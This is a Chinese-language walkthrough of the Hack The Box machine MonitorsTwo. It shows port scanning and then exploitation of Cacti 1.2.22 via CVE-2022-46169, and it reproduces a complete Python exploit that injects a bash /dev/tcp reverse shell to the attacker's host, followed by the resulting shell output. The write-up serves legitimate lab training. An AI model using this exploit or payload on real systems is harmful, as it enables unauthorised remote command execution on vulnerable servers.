# Untitled

### 目标探测

Nmap对目标端口进行全端口扫描

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/MonitorsTwo]
└─# nmap -n -v -sS -p- 10.10.11.211 --max-retries=0 -oN allport.txt -Pn
# Nmap 7.94 scan initiated Wed Aug 30 02:15:07 2023 as: nmap -n -v -sS -p- --max-retries=0 -oN allport.txt -Pn 10.10.11.211
Warning: 10.10.11.211 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.11.211
Host is up (0.41s latency).
Not shown: 38872 closed tcp ports (reset), 26661 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Aug 30 02:25:59 2023 -- 1 IP address (1 host up) scanned in 652.10 seconds
```

可以看到目标开放了两个端口，接下来对开放的两个端口进行详细的扫描

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/MonitorsTwo]
└─# nmap -n -v -sC -sV -p $(cat allport.txt | grep ^[0-9]|cut -d / -f1|tr '\n' ','|sed s/,$//) 10.10.11.211 -oN nmap.txt -Pn
# Nmap 7.94 scan initiated Wed Aug 30 02:26:33 2023 as: nmap -n -v -sC -sV -p 22,80 -oN nmap.txt -Pn 10.10.11.211
Nmap scan report for 10.10.11.211
Host is up (0.42s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 30 02:27:25 2023 -- 1 IP address (1 host up) scanned in 51.63 seconds
```

这里没有什么有用的东西，先访问目标80端口看看

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### 漏洞利用

是一个登录框，可以看到这个页面Cacti 1.2.22版本，我们先searchsploit

Cacti 是一个用于监控和图形化显示网络设备性能数据的开源网络图形工具。它提供了一个基于Web的用户界面，允许网络管理员收集、存储和图形化显示各种网络设备的性能数据，以便更好地理解和分析网络的运行状况。

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/MonitorsTwo]
└─# searchsploit cacti 1.2.22           
-------------------------------------------- ---------------------------------
 Exploit Title                              |  Path
-------------------------------------------- ---------------------------------
Cacti v1.2.22 - Remote Command Execution (R | php/webapps/51166.py
-------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

这是个命令注入的exp，但是这个exp不能在这里不能利用，在GitHub上面搜索该CVE-2022-46169编号，找到一个反弹shell的exp

{% embed url="https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/blob/main/CVE-2022-46169.py" %}

```
import requests, optparse, sys
import urllib

def get_arguments():
    parser= optparse.OptionParser()
    parser.add_option('-u', '--url', dest='url_target', help='The url target')
    parser.add_option('', '--LHOST', dest='lhost', help='Your ip')
    parser.add_option('', '--LPORT', dest='lport', help='The listening port')
    (options, arguments) = parser.parse_args()
    if not options.url_target:
        parser.error('[*] Pls indicate the target URL, example: -u http://10.10.10.10')
    if not options.lhost:
        parser.error('[*] Pls indicate your ip, example: --LHOST=10.10.10.10')
    if not options.lport:
        parser.error('[*] Pls indicate the listening port for the reverse shell, example: --LPORT=443')
    return options

def checkVuln():
    r = requests.get(Vuln_url, headers=headers)
    return (r.text != "FATAL: You are not authorized to use this service" and r.status_code != 403)

def bruteForcing():
    for n in range(1,5):
        for n2 in range(1,10):
            id_vulnUrl = f"{Vuln_url}?action=polldata&poller_id=1&host_id={n}&local_data_ids[]={n2}"
            r = requests.get(id_vulnUrl, headers=headers)
            if r.text != "[]":
                RDname = r.json()[0]["rrd_name"]
                if RDname == "polling_time" or RDname == "uptime":
                    print("Bruteforce Success!!")
                    return True, n, n2
    return False, 1, 1

def Reverse_shell(payload, host_id, data_ids):
    PayloadEncoded = urllib.parse.quote(payload)
    InjectRequest = f"{Vuln_url}?action=polldata&poller_id=;{PayloadEncoded}&host_id={host_id}&local_data_ids[]={data_ids}"
    r = requests.get(InjectRequest, headers=headers)


if __name__ == '__main__':
    options = get_arguments()
    Vuln_url = options.url_target + '/remote_agent.php'
    headers = {"X-Forwarded-For": "127.0.0.1"}
    print('Checking...')
    if checkVuln():
        print("The target is vulnerable. Exploiting...")
        print("Bruteforcing the host_id and local_data_ids")
        is_vuln, host_id, data_ids = bruteForcing()
        myip = options.lhost
        myport = options.lport
        payload = f"bash -c 'bash -i >& /dev/tcp/{myip}/{myport} 0>&1'"
        if is_vuln:
            Reverse_shell(payload, host_id, data_ids)
        else:
            print("The Bruteforce Failled...")

    else:
        print("The target is not vulnerable")
        sys.exit(1)

```

用该脚本利用漏洞

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/MonitorsTwo]
└─# python3 CVE-2022-46169.py -u http://10.10.11.211/ --LHOST=10.10.16.3 --LPORT=8889
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!
```

监听端口返回一个shell

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/MonitorsTwo]
└─# nc -lnvp 8889
listening on [any] 8889 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.211] 40194
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

